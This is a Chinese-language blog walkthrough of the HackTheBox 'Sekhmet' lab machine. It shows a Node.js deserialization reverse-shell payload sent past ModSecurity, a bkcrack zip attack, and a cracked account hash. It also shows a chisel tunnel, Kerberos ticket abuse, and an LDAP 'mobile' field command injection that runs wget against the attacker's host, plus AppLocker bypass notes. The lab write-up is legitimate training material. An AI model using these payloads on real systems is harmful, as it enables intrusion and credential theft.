<!DOCTYPE html>
<html>
<head>
    

    

    



    <meta charset="utf-8">
    
    
    
    
    <title>Sekhmet - HackTheBox | 喵喵喵喵 | 愚かな人間</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="theme-color" content="#66CCFF">
    
    
    <meta name="keywords" content="HackTheBox">
    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;495  10.10.11.179                                                                                                              端口扫描22和80: 12345678">
<meta property="og:type" content="article">
<meta property="og:title" content="Sekhmet - HackTheBox">
<meta property="og:url" content="https://darkwing.moe/2022/12/28/Sekhmet-HackTheBox/index.html">
<meta property="og:site_name" content="喵喵喵喵">
<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;495  10.10.11.179                                                                                                              端口扫描22和80: 12345678">
<meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022122706.jpg">
<meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022122801.jpg">
<meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022122802.jpg">
<meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022122803.jpg">
<meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022122804.jpg">
<meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022122805.jpg">
<meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022122806.jpg">
<meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022122807.jpg">
<meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022122808.jpg">
<meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022122809.jpg">
<meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022122810.jpg">
<meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022122811.jpg">
<meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022122812.jpg">
<meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022122813.jpg">
<meta property="article:published_time" content="2022-12-28T07:38:36.000Z">
<meta property="article:modified_time" content="2023-04-03T01:01:24.452Z">
<meta property="article:author" content="暗羽">
<meta property="article:tag" content="HackTheBox">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022122706.jpg">
    
        <link rel="alternate" type="application/atom+xml" title="喵喵喵喵" href="/atom.xml">
    
    <link rel="shortcut icon" href="/favicon.ico">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
    <script>window.lazyScripts=[]</script>

    <!-- custom head -->
    

<meta name="generator" content="Hexo 4.2.0"></head>

<body>
    <div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">暗羽</h5>
          <a href="mailto:Discord@darkwing_nya" title="Discord@darkwing_nya" class="mail">Discord@darkwing_nya</a>
        </hgroup>
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="waves-block waves-effect">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                主页
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                Archives
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                Tags
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                Categories
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://github.com/zjicmDarkWing" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://twitter.com/darkwing_nya" target="_blank" >
                <i class="icon icon-lg icon-gratipay"></i>
                Twitter
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://www.buymeacoffee.com/darkwing_nya" target="_blank" >
                <i class="icon icon-lg icon-coffee"></i>
                Buy me a coffee
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://darkwing.moe/2015/01/01/about/"  >
                <i class="icon icon-lg icon-link"></i>
                About
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row">
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">Sekhmet - HackTheBox</div>
        
        <div class="search-wrap" id="search-wrap">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                <i class="icon icon-lg icon-chevron-left"></i>
            </a>
            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                <i class="icon icon-lg icon-search"></i>
            </a>
        </div>
        
        
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
            <i class="icon icon-lg icon-share-alt"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">

    <div class="container fade-scale">
        <h1 class="title">Sekhmet - HackTheBox</h1>
        <h5 class="subtitle">
            
                <time datetime="2022-12-28T07:38:36.000Z" itemprop="datePublished" class="page-time">
  2022-12-28
</time>


            
        </h5>
    </div>

    


</header>


<div class="container body-wrap">
    
    <aside class="post-widget">
        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
            <h4>TOC</h4>
            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#基本信息"><span class="post-toc-number">1.</span> <span class="post-toc-text">基本信息</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#10-10-11-179"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">10.10.11.179</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#端口扫描"><span class="post-toc-number">2.</span> <span class="post-toc-text">端口扫描</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#80"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">80</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#子域名扫描"><span class="post-toc-number">3.</span> <span class="post-toc-text">子域名扫描</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#portal"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">portal</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#portal-1"><span class="post-toc-number">4.</span> <span class="post-toc-text">portal</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#ModSecurity"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">ModSecurity</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#shell"><span class="post-toc-number">4.2.</span> <span class="post-toc-text">shell</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#backup-zip"><span class="post-toc-number">5.</span> <span class="post-toc-text">backup.zip</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#ray-duncan-amp-user-flag"><span class="post-toc-number">6.</span> <span class="post-toc-text">ray.duncan &amp; user flag</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#容器网络扫描"><span class="post-toc-number">7.</span> <span class="post-toc-text">容器网络扫描</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#SMB"><span class="post-toc-number">8.</span> <span class="post-toc-text">SMB</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#LDAP"><span class="post-toc-number">9.</span> <span class="post-toc-text">LDAP</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#命令注入"><span class="post-toc-number">9.1.</span> <span class="post-toc-text">命令注入</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#applocker"><span class="post-toc-number">9.2.</span> <span class="post-toc-text">applocker</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#scriptrunner"><span class="post-toc-number">10.</span> <span class="post-toc-text">scriptrunner</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#信息"><span class="post-toc-number">10.1.</span> <span class="post-toc-text">信息</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#bob-wood"><span class="post-toc-number">11.</span> <span class="post-toc-text">bob.wood</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#bob-woodADM"><span class="post-toc-number">12.</span> <span class="post-toc-text">bob.woodADM</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#参考资料"><span class="post-toc-number">13.</span> <span class="post-toc-text">参考资料</span></a></li></ol>
        </nav>
    </aside>


<article id="post-Sekhmet-HackTheBox"
  class="post-article article-type-post fade" itemprop="blogPost">

    <div class="post-card">
        <h1 class="post-card-title">Sekhmet - HackTheBox</h1>
        <div class="post-meta">
            <time class="post-time" title="2022-12-28 15:38:36" datetime="2022-12-28T07:38:36.000Z"  itemprop="datePublished">2022-12-28</time>

            


            
<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
</span>


        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            <h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><ul>
<li><p><a href="https://www.hackthebox.com/home/machines/profile/495" target="_blank" rel="noopener">https://www.hackthebox.com/home/machines/profile/495</a></p>
</li>
<li><h2 id="10-10-11-179"><a href="#10-10-11-179" class="headerlink" title="10.10.11.179"></a>10.10.11.179</h2></li>
</ul>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122706.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>22和80:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV -Pn 10.10.11.179</span></span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-28 13:12 CST</span><br><span class="line">Nmap scan report for 10.10.11.179</span><br><span class="line">Host is up (0.19s latency).</span><br><span class="line">Not shown: 998 filtered tcp ports (no-response)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   3072 8c7155df97275ed5375a8de2923bf36e (RSA)</span><br><span class="line">|   256 b232f5889bfb58fa35b0710c9abd3cef (ECDSA)</span><br><span class="line">|_  256 eb73c0936e40c8f6b0a828937d18474c (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.18.0</span><br><span class="line">|_http-title: 403 Forbidden</span><br><span class="line">|_http-server-header: nginx/1.18.0</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 116.09 seconds</span><br></pre></td></tr></table></figure>



<h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>需要加hosts：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.179 www.windcorp.htb</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122801.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="子域名扫描"><a href="#子域名扫描" class="headerlink" title="子域名扫描"></a>子域名扫描</h1><p>继续扫描子域名发现portal：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w ~/Tools/dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u "http://www.windcorp.htb/" -H 'Host: FUZZ.windcorp.htb' -fs 153</span><br><span class="line"></span><br><span class="line">portal                  [Status: 403, Size: 2436, Words: 234, Lines: 44, Duration: 203ms]</span><br></pre></td></tr></table></figure>

<h2 id="portal"><a href="#portal" class="headerlink" title="portal"></a>portal</h2><p>同样加hosts后访问：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122802.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="portal-1"><a href="#portal-1" class="headerlink" title="portal"></a>portal</h1><p>常规弱口令 admin:admin 登录，根据cookie和响应头可以知道是nodejs：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122803.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="ModSecurity"><a href="#ModSecurity" class="headerlink" title="ModSecurity"></a>ModSecurity</h2><p>简单测试可以发现存在ModSecurity：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122804.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h2><p>利用modsecurity ruleset bypass和nodejs rce实现rce：</p>
<ul>
<li>ModSecurity Vulnerability &amp; PoC (CVE-2019-19886)<br><a href="https://www.secjuice.com/modsecurity-vulnerability-cve-2019-19886/" target="_blank" rel="noopener">https://www.secjuice.com/modsecurity-vulnerability-cve-2019-19886/</a></li>
<li>Exploiting Node.js deserialization bug for Remote Code Execution | OpSecX<br><a href="https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/" target="_blank" rel="noopener">https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/</a></li>
<li>Node.Js-Security-Course/nodejsshell.py at master · ajinabraham/Node.Js-Security-Course<br><a href="https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py" target="_blank" rel="noopener">https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py</a></li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python2 nodejsshell.py 10.10.14.6 4444</span><br><span class="line"></span><br><span class="line">curl -i --cookie "app=$cookie_app;profile=$(echo '&#123;"username":"_$$ND_FUNC$$_function()&#123;eval(String.fromCharCode(10,......59,10))&#125;()"&#125;'|base64 -w0)=&lt;original_cookie&gt;" 'http://portal.windcorp.htb/'</span><br></pre></td></tr></table></figure>

<p>得到webster用户shell：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122805.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="backup-zip"><a href="#backup-zip" class="headerlink" title="backup.zip"></a>backup.zip</h1><p>zip文件无法直接破解，但能够查看里面目录结构，知道其中包括/etc/passwd文件，我们可以尝试已知明文攻击：</p>
<ul>
<li>Brute Force - CheatSheet - HackTricks<br><a href="https://book.hacktricks.xyz/generic-methodologies-and-resources/brute-force#known-plaintext-zip-attack" target="_blank" rel="noopener">https://book.hacktricks.xyz/generic-methodologies-and-resources/brute-force#known-plaintext-zip-attack</a></li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> create a zip of the passwd file</span></span><br><span class="line">cp /etc/passwd . &amp;&amp; zip passwd.zip passwd</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> crack and this produces a sequence of codes</span></span><br><span class="line">./bkcrack -C backup.zip -c etc/passwd -P passwd.zip -p passwd</span><br><span class="line">d6829d8d 8514ff97 afc3f825</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">set</span> a new pass to the encrypted file</span></span><br><span class="line">./bkcrack -C backup.zip -U unlocked.zip miao -k d6829d8d 8514ff97 afc3f825</span><br></pre></td></tr></table></figure>

<p>var/lib/sss/db/cache_windcorp.htb.ldb中发现一组账号hash,破解出来密码是pantera：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Ray.Duncan@WINDCORP.HTB</span><br><span class="line"></span><br><span class="line">$6$nHb338EAa7BAeuR0$MFQjz2.B688LXEDsx035.Nj.CIDbe&#x2F;u98V3mLrMhDHiAsh89BX9ByXoGzcXnPXQQF&#x2F;hAj5ajIsm0zB.wg2zX81</span><br><span class="line"></span><br><span class="line">pantera</span><br></pre></td></tr></table></figure>

<h1 id="ray-duncan-amp-user-flag"><a href="#ray-duncan-amp-user-flag" class="headerlink" title="ray.duncan &amp; user flag"></a>ray.duncan &amp; user flag</h1><p>使用域账号ssh登录，ray.duncan可以得到webserver的root权限：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh &#39;ray.duncan@windcorp.htb&#39;@10.10.11.179</span><br><span class="line"></span><br><span class="line">pantera</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122806.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>webserver的root得到user flag：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122807.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="容器网络扫描"><a href="#容器网络扫描" class="headerlink" title="容器网络扫描"></a>容器网络扫描</h1><p>进一步探测容器子网,发现192.168.0.2应该是DC：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">for p in &#123;1..65535&#125;; do nc -vn 192.168.0.2 $p -w 1 -z &amp; done 2&gt; output.txt</span><br><span class="line"></span><br><span class="line">(UNKNOWN) [192.168.0.2] 22 (ssh) open</span><br><span class="line">(UNKNOWN) [192.168.0.2] 53 (domain) open</span><br><span class="line">(UNKNOWN) [192.168.0.2] 80 (http) open</span><br><span class="line">(UNKNOWN) [192.168.0.2] 88 (kerberos) open</span><br><span class="line">(UNKNOWN) [192.168.0.2] 389 (ldap) open</span><br><span class="line">(UNKNOWN) [192.168.0.2] 445 (microsoft-ds) open</span><br><span class="line">(UNKNOWN) [192.168.0.2] 464 (kpasswd) open</span><br><span class="line">(UNKNOWN) [192.168.0.2] 3268 (?) open</span><br><span class="line">(UNKNOWN) [192.168.0.2] 3269 (?) open</span><br><span class="line">(UNKNOWN) [192.168.0.2] 5985 (?) open</span><br><span class="line">(UNKNOWN) [192.168.0.2] 9389 (?) open</span><br><span class="line">(UNKNOWN) [192.168.0.2] 49664 (?) open</span><br><span class="line">(UNKNOWN) [192.168.0.2] 51648 (?) open</span><br><span class="line">(UNKNOWN) [192.168.0.2] 58219 (?) open</span><br><span class="line">(UNKNOWN) [192.168.0.2] 64610 (?) open</span><br></pre></td></tr></table></figure>

<p>所以需要设置代理和DC通信：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">local</span></span></span><br><span class="line">./chisel_1.7.0-rc7_darwin_amd64 server -p 9999 --reverse</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> target</span></span><br><span class="line">./chisel_1.7.6_linux_amd64 client --max-retry-count=1 -v 10.10.14.6:9999 R:1080:socks</span><br></pre></td></tr></table></figure>

<p>然后设置好proxychains,即可和DC通信：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 ~/Tools/impacket/examples/getST.py -dc-ip 192.168.0.2 -spn cifs/hope.windcorp.htb 'windcorp.htb/ray.duncan:pantera'</span><br></pre></td></tr></table></figure>

<h1 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h1><p>上面已经获得了ST，使用ST访问smb：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=ray.duncan.ccache</span><br><span class="line">proxychains4 python3 ~/Tools/impacket/examples/smbclient.py ray.duncan@hope.windcorp.htb -k -no-pass</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> shares</span></span><br><span class="line"><span class="meta">ADMIN$</span><span class="bash"></span></span><br><span class="line"><span class="meta">C$</span><span class="bash"></span></span><br><span class="line"><span class="meta">IPC$</span><span class="bash"></span></span><br><span class="line">NETLOGON</span><br><span class="line">SYSVOL</span><br><span class="line">WC-Share</span><br><span class="line"><span class="meta">#</span><span class="bash"> use WC-Share</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> temp</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> cat debug-users.txt</span></span><br><span class="line">IvanJennings43235345</span><br><span class="line">MiriamMills93827637</span><br><span class="line">BenjaminHernandez23232323</span><br><span class="line">RayDuncan9342211</span><br></pre></td></tr></table></figure>

<h1 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h1><p>参考这个：</p>
<ul>
<li>MS ADV190023<br><a href="https://gist.github.com/tscherf/a0be193fe7bd603bbe1f511f9a00e737" target="_blank" rel="noopener">https://gist.github.com/tscherf/a0be193fe7bd603bbe1f511f9a00e737</a></li>
</ul>
<p>在受感染的容器上，转储 ldap 数据库以获取更多信息：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -LLLY GSSAPI -H ldap:&#x2F;&#x2F;windcorp.htb -b &#39;DC&#x3D;windcorp,DC&#x3D;htb&#39; &gt; ldapinfo.txt</span><br></pre></td></tr></table></figure>

<h2 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h2><p>我们可以更改 <code>ray.duncan</code> 的手机号，这个字段容易被cmd注入。以以下形式构造有效负载：<code>mobile: ;&lt;cmd&gt;</code></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> create a mod.ldif</span></span><br><span class="line">dn: CN=Ray Duncan,OU=Development,DC=windcorp,DC=htb</span><br><span class="line">changetype: modify</span><br><span class="line">replace: mobile</span><br><span class="line">mobile: ;wget http://10.10.14.6:7777/file -O c:\wc-share\file;</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="keyword">then</span> send to modify the ldap record</span></span><br><span class="line">ldapmodify -Y GSSAPI -H ldap://windcorp.htb -D "CN=Ray Duncan,OU=Development,DC=windcorp,DC=htb" -f mod.ldif</span><br></pre></td></tr></table></figure>

<p>检查更改并等待一段时间（2 分钟）以观察希望的请求。<strong>注意</strong>：mobile字段有字符限制（即 64）</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122808.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="applocker"><a href="#applocker" class="headerlink" title="applocker"></a>applocker</h2><p>目标正在运行<strong>applocker</strong>，我们可以制作一个 ldif 来获取 applocker 策略</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dn: CN&#x3D;Ray Duncan,OU&#x3D;Development,DC&#x3D;windcorp,DC&#x3D;htb</span><br><span class="line">changetype: modify</span><br><span class="line">replace: mobile</span><br><span class="line">mobile: ;Get-AppLockerPolicy -Effective -Xml &gt; c:\wc-share\u</span><br></pre></td></tr></table></figure>

<p>通过阅读政策，我们了解到我们需要寻找一个不在例外列表中的可以写入的文件夹</p>
<p>参考这个：</p>
<ul>
<li>World-writable directories in %windir%<br><a href="https://gist.github.com/mattifestation/5f9de750470c9e0e1f9c9c33f0ec3e56" target="_blank" rel="noopener">https://gist.github.com/mattifestation/5f9de750470c9e0e1f9c9c33f0ec3e56</a></li>
</ul>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">FilePathRule</span> <span class="attr">Id</span>=<span class="string">"2c47f772-4d79-4493-b64b-613e17f0011c"</span> <span class="attr">Name</span>=<span class="string">"All files located in the Windows folder"</span> <span class="attr">Description</span>=<span class="string">"Allows members of the Everyone group to run applications that are located in the Windows folder."</span> <span class="attr">UserOrGroupSid</span>=<span class="string">"S-1-1-0"</span> <span class="attr">Action</span>=<span class="string">"Allow"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Conditions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">FilePathCondition</span> <span class="attr">Path</span>=<span class="string">"%WINDIR%\*"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Conditions</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Exceptions</span>&gt;</span></span><br><span class="line">        ...</span><br><span class="line">    <span class="tag">&lt;/<span class="name">Exceptions</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们需要的另一件事是绕过<strong>amsi</strong>,参考：</p>
<ul>
<li>Powershell CLM Bypass Using Runspaces<br><a href="https://www.secjuice.com/powershell-constrainted-language-mode-bypass-using-runspaces/" target="_blank" rel="noopener">https://www.secjuice.com/powershell-constrainted-language-mode-bypass-using-runspaces/</a></li>
</ul>
<h1 id="scriptrunner"><a href="#scriptrunner" class="headerlink" title="scriptrunner"></a>scriptrunner</h1><p>编译后继续通过ldap出发执行，得到DC上的scriptrunner shell：</p>
